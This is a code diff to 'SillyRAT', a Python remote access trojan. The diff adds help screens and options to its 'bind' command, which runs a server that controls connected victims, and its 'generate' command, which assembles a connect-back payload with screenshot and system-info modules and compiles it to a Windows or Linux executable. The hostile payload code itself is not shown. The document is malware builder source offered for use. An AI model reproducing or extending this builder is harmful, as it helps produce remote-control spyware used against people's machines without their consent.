@@ -9,6 +9,7 @@ import subprocess
 import argparse
 import shutil
 import threading
+import platform
 import PyInstaller.__main__
 from datetime import datetime
 
@@ -20,6 +21,46 @@ __LOGO__ = """
 |____/|_|_|_|\\__, |_| \\_\\/_/   \\_\\_|  
              |___/                    
                     %s v1.0 @hash3liZer/@TheFlash2k
+"""
+
+__HELP_OVERALL__ = """usage: python3 sillyray.py command [--help] [--option OPTION]
+
+These are the commands available for usage: 
+   
+    bind        Run the Server on machine and establish connections
+    generate    Generate the Payload file for target platform
+
+You can further get help on available commands by supplying
+'--help' argument. For example: 'python3 sillyrat generate --help'
+will print help manual for generate commmand 
+"""
+
+__HELP_BIND__   = """usage: python3 sillyrat.py bind [--address ADDRESS] [--port PORT]
+
+    Args            Description
+    -h, --help      Show Help for Bind command
+    -a, --address   IP Address to Bind to
+    -p, --port      Port Number on which to Bind
+
+The Bind command is used to bind the application on server
+for incoming connections and control the clients through 
+the command interface
+"""
+
+__HELP_GENERATE__ = """
+usage: python3 sillyrat.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]
+
+    Args            Description
+    -h, --help      Show Help Manual for generate command
+    -a, --address   IP Address of server. [Connect to]
+    -p, --port      Port of connecting server
+    -o, --output    Output file to generate
+    -s, --source    Do not generate compiled code.
+                    Gives Python source file.
+
+The generate command generates the required payload
+file to be executed on client side. The establish
+connection to server and do commands. 
 """
 
 class PULL:
@@ -147,6 +188,21 @@ class PULL:
         print("$ disconnect")
         sys.stdout.write("\n")
 
+    def help_overall(self):
+        global __HELP_OVERALL__
+        print(__HELP_OVERALL__)
+        sys.exit(0)
+
+    def help_bind(self):
+        global __HELP_BIND__
+        print(__HELP_BIND__)
+        sys.exit(0)
+
+    def help_generate(self):
+        global __HELP_GENERATE__
+        print(__HELP_GENERATE__)
+        sys.exit(0)
+    
 pull = PULL()
 
 class CLIENT:
@@ -451,7 +507,8 @@ class GENERATOR:
     def __init__(self, prs):
         self.address = prs.address
         self.port    = prs.port
-        self.output  = prs.output
+        self.source  = prs.source
+        self.output  = self.get_output(prs.output)
         self.pather  = self.get_path()
         self.v_imports = self.get_imports()
         self.v_consts  = self.get_consts()
@@ -459,6 +516,26 @@ class GENERATOR:
         self.v_screenshot = self.get_screenshot()
         self.v_client  = self.get_client()
         self.v_main    = self.get_main()
+
+    def get_output(self, out):
+        rtval = ""
+        if self.source:
+            if not out.endswith(".py"):
+                rtval = (out + ".py")
+            else:
+                rtval = out
+        else:
+            if platform.system() == "Windows":
+                if not out.endswith(".exe"):
+                    rtval = (out + ".exe")
+                else:
+                    rtval = out
+            elif platform.system() == "Linux":
+                rtval = (out)
+            else:
+                pull.exit("Unrecognized Platform")
+
+        return rtval
 
     def get_path(self):
         dirname = os.path.dirname(__file__)
@@ -518,6 +595,20 @@ class GENERATOR:
 
         return (dirname, fname, 'cl.py')
 
+    def patch(self):
+        time.sleep(2)
+        pull.function("Compiling modules ... ")
+        self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_sysinfo + "\n\n" + \
+                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
+        time.sleep(2)
+        pull.function("Generating source code ...")
+        fl = open(self.output, 'w')
+        fl.write(self.data)
+        fl.close()
+        time.sleep(2)
+        pull.print("Code generated successfully!")
+        pull.print("File: " + self.output)
+
     def generate(self):
         time.sleep(2)
         pull.function("Compiling modules ... ")
@@ -562,12 +653,32 @@ class GENERATOR:
 
 class PARSER:
 
+    COMMANDS = ['bind', 'generate']
+
     def __init__(self, prs):
-        self.address = self.v_address(prs.address)
-        self.port    = self.v_port(prs.port)
-        self.mode    = self.v_mode(prs.mode)
-        if self.mode == "generate":
-            self.output = self.v_output(prs.output)
+        self.mode    = self.v_mode(prs.mode, prs.help)
+        self.help    = self.v_help(prs.help)
+
+        if self.mode == "bind":
+            self.address = self.v_address(prs.address)
+            self.port    = self.v_port(prs.port)
+        elif self.mode == "generate":
+            self.address = self.v_address(prs.address)
+            self.port    = self.v_port(prs.port)
+            self.output  = self.v_output(prs.output)
+            self.source  = prs.source
+
+    def v_help(self, hl):
+        if hl:
+            if not self.mode:
+                pull.help_overall()
+            else:
+                if self.mode == "bind":
+                    pull.help_bind()
+                elif self.mode == "generate":
+                    pull.help_generate()
+                else:
+                    pull.help_help()
 
     def v_address(self, str):
         return str
@@ -581,14 +692,15 @@ class PARSER:
 
         return port
 
-    def v_mode(self, val):
+    def v_mode(self, val, hl):
         if val:
-            if val == "bind" or val == "generate":
+            if val in self.COMMANDS:
                 return val
             else:
-                pull.exit("Invalid Syntax")
+                pull.exit("No such command found in database")
         else:
-            pull.exit("Invalid Syntax!")
+            if not hl:
+                pull.exit("Invalid Syntax. Refer to the manual!")
 
     def v_output(self, val):
         if val:
@@ -602,12 +714,14 @@ class PARSER:
 def main():
     pull.logo()
 
-    parser = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser(add_help=False)
 
-    parser.add_argument('mode', help="Moder")
-    parser.add_argument('-a', '--address', dest="address", default="0.0.0.0", type=str, help="Address to Bind to")
+    parser.add_argument('mode', nargs="?", help="Moder")
+    parser.add_argument('-h', '--help'   , dest="help"   , default=False, action="store_true", help="Help Manual")
+    parser.add_argument('-a', '--address', dest="address", default="", type=str, help="Address to Bind to")
     parser.add_argument('-p', '--port'   , dest="port"   , default=0 , type=int, help="Port to Bind to")
     parser.add_argument('-o', '--output' , dest="output" , default="", type=str, help="Complete Path to Output File!")
+    parser.add_argument('-s', '--source' , dest="source" , default=False, action="store_true", help="Source file")
 
     parser = parser.parse_args()
 
@@ -619,12 +733,15 @@ def main():
         iface.accept()
         iface.launch()
         iface.close()
-    else:
+    elif parser.mode == "generate":
         pull.function("Starting Generator Mode!")
         generator = GENERATOR(parser)
-        generator.generate()
-        generator.compile()
-        generator.clean()
+        if generator.source:
+            generator.patch()
+        else:
+            generator.generate()
+            generator.compile()
+            generator.clean()
         pull.function("Done")
 
 if __name__ == "__main__":
